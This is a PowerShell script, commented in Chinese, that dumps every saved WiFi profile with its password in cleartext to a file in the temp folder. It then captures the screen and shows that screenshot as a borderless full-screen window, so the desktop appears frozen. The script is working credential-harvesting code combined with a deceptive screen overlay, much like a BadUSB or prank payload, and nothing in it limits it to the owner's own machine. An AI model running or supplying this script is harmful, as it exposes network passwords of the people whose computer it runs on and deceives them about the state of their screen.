# 获取所有用户配置文件
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }

# 初始化输出内容
$output = ""

foreach ($profile in $profiles) {
    # 获取每个配置文件的详细信息
    $details = netsh wlan show profile name="$profile" key=clear

    # 获取 WiFi 名称
    $wifiName = $details | Select-String "SSID name" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }
    # 获取密钥内容
    $keyContent = $details | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }

    # 添加到输出内容
    $output += "WiFi Name: $wifiName`n"
    $output += "Key: $keyContent`n"
    $output += "`n"
}

# 写入到记事本
$outputFilePath = "$env:TEMP\WiFiDetails.txt"
$output | Out-File -FilePath $outputFilePath

# 截图并保存
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$screenshotFilePath = "$env:TEMP\Screenshot.png"
$bitmap.Save($screenshotFilePath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

# 打开截图
Start-Process powershell -ArgumentList "Start-Sleep -Seconds 1; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Application]::EnableVisualStyles(); $form = New-Object Windows.Forms.Form; $form.WindowState = 'Maximized'; $form.FormBorderStyle = 'None'; $pictureBox = New-Object Windows.Forms.PictureBox; $pictureBox.Image = [System.Drawing.Image]::FromFile('$screenshotFilePath'); $pictureBox.SizeMode = 'StretchImage'; $pictureBox.Dock = 'Fill'; $form.Controls.Add($pictureBox); $form.ShowDialog()"
